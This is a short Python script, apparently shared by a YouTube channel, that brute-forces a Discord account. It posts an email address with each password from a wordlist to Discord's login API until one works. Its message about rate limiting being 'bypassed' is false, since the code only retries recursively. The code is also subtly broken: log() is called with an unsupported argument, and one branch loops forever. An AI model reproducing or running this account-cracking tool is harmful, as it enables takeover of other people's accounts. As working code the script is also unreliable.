import requests
import os
from colorama import init, Fore
from datetime import datetime

init(autoreset=True)

def log(message, level="INFO"):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    if level == "INFO":
        print(f"{timestamp} {Fore.GREEN}[INFO]{Fore.RESET} {message}", end="")
    elif level == "WARNING":
        print(f"{timestamp} {Fore.YELLOW}[WARNING]{Fore.RESET} {message}", end="")
    elif level == "ERROR":
        print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}", end="")
    else:
        print(message, end="")
        
def main():
    log("YT: Discord Cracker")
    log("--------------------")

    email = input("Enter your email: ")

    log("1: Normal login")
    log("2: Auto login")
    select = input()

    if select == "2":
        password_file_path = input("Enter the path to the password file: ")

        if not os.path.exists(password_file_path):
            log("Password file not found. Exiting...", "ERROR")
            return

        with open(password_file_path, 'r') as file:
            passwords = file.read().splitlines()

        log("Trying passwords...\n")

        for password in passwords:
            log(f"Testing password: {password}... ", end="")
            login_result = test_login(email, password)

            if login_result:
                log("\n\n\nCracked successful!", "INFO")
                log(f"email: {email}")
                log(f"password: {password}")
                break
            else:
                log("Login failed.", "WARNING")

        log("\nCracked complete.")
    else:
        password = input("Enter your password: ")

        while True:
            log(f"Trying password: {password}... ", end="")
            login_result = test_login(email, password)

            if login_result:
                log("Login successful!", "INFO")
                break
            else:
                log("Login failed.", "WARNING")

def test_login(email, password):
    try:
        request_url = "https://discord.com/api/v9/auth/login"
        headers = {"Host": "discord.com"}
        data = {"login": email, "password": password}
        response = requests.post(request_url, headers=headers, json=data)

        if response.status_code == 200:
            return True
        elif response.status_code == 429:
            log("YT: Too Many Requests Bypass Statuscode 429 successful!", "INFO")
            return test_login(email, password)
        else:
            log(response.status_code, "WARNING")
            return False
    except Exception as ex:
        log(f"YT: An error occurred: {str(ex)}", "ERROR")
        return False

if __name__ == "__main__":
    main()
